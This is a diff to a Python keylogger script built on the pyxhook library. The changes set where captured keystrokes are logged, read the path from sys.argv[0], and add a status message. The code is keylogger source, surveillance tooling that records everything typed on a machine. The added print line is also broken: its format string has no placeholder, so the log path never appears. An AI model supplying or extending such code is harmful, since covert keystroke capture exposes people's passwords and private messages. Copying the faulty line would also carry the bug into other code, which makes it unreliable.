@@ -1,5 +1,5 @@
 #!/usr/bin/env python
-import os
+import os, sys
 import pyxhook
 
 # This tells the keylogger where the log file will go.
@@ -7,8 +7,10 @@ import pyxhook
 # or use the default ~/Desktop/file.log
 log_file = os.environ.get(
     'pylogger_file',
-    os.path.join(os.path.dirname(os.path.realpath(__file__)), 'log') #replaced with a string literal using sed
+    os.path.join(os.path.dirname(os.path.realpath(sys.argv[0])), 'log') #replaced with a string literal using sed
 )
+
+print("logging keystrokes to ".format(log_file))
 
 # Allow clearing the log file on start, if pylogger_clean is defined.
 # if os.environ.get('pylogger_clean', None) is not None:
